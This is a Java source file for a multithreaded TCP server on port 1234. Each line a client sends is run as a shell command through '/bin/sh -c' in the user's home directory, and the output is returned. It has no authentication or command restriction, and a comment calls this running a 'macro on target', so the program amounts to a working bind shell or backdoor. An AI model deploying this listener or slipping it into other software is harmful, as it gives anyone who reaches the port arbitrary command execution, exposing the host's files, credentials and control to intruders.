/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

/**
 *
 * @author thecsr
 */
import java.io.*;
import java.net.*;
import java.util.ArrayList;
import java.util.logging.*;

// Server class
class Server {

    private static Logger logr = Logger.getLogger(Server.class.getName());

    private static void setupLogger() {
        LogManager.getLogManager().reset();
        logr.setLevel(Level.CONFIG);

        ConsoleHandler ch = new ConsoleHandler();
        ch.setLevel(Level.SEVERE);
        logr.addHandler(ch);

        try {
            FileHandler fh = new FileHandler("myLogger.log");
            fh.setLevel(Level.FINE);
            logr.addHandler(fh);
            logr.info("Logger initialized");
        } catch (java.io.IOException e) {
            logr.log(Level.WARNING, "file logger not working", e);
        }

    }

    public static void main(String[] args) {
        ServerSocket server = null;
        Server.setupLogger();

        try {

            // server is listening on port 1234
            server = new ServerSocket(1234);
            server.setReuseAddress(true);

            // running infinite loop for getting
            // client request
            while (true) {

                // socket object to receive incoming client
                // requests
                Socket client = server.accept();

                // Displaying that new client is connected
                // to server
                System.out.println("New client connected"
                        + client.getInetAddress()
                                .getHostAddress());

                // create a new thread object
                ClientHandler clientSock
                        = new ClientHandler(client);

                // This thread will handle the client
                // separately
                new Thread(clientSock).start();
            }
        } catch (IOException e) {
            logr.log(Level.WARNING, e.toString(), e);
        } finally {
            if (server != null) {
                try {
                    server.close();
                } catch (IOException e) {
                    logr.log(Level.WARNING, e.toString(), e);
                }
            }
        }
    }

    // ClientHandler class
    private static class ClientHandler implements Runnable {

        private final Socket clientSocket;
        ArrayList<String> dataReceive = new ArrayList<>();

        // Constructor
        public ClientHandler(Socket socket) {
            this.clientSocket = socket;
        }

        @SuppressWarnings("CallToPrintStackTrace")
        public void run() {
            PrintWriter out = null;
            BufferedReader in = null;
            try {

                // get the outputstream of client
                out = new PrintWriter(
                        clientSocket.getOutputStream(), true);

                // get the inputstream of client
                in = new BufferedReader(
                        new InputStreamReader(
                                clientSocket.getInputStream()));

                String line;
                while ((line = in.readLine()) != null) {

                    // writing the received message from
                    // client
                    String homeDirectory = System.getProperty("user.home");

                    //Run macro on target
                    ProcessBuilder pb = new ProcessBuilder("/bin/sh", "-c", line);
                    pb.directory(new File(homeDirectory));
                    pb.redirectErrorStream(true);
                    Process process = pb.start();
                    //Read output
                    StringBuilder bui = new StringBuilder();
                    BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    String innerLine;
                    String previous = null;
                    while ((innerLine = br.readLine()) != null) {
                        if (!innerLine.equals(previous)) {
                            previous = innerLine;
                            bui.append(innerLine).append('\n');
                        }
                    }
                    out.println(bui.toString());
                }
            } catch (IOException e) {
                logr.log(Level.INFO, e.toString(), e);
            } finally {
                try {
                    if (out != null) {
                        out.close();
                    }
                    if (in != null) {
                        in.close();
                        clientSocket.close();
                    }
                } catch (IOException e) {
                  logr.log(Level.INFO, e.toString(), e);
                }
            }
        }
    }
}
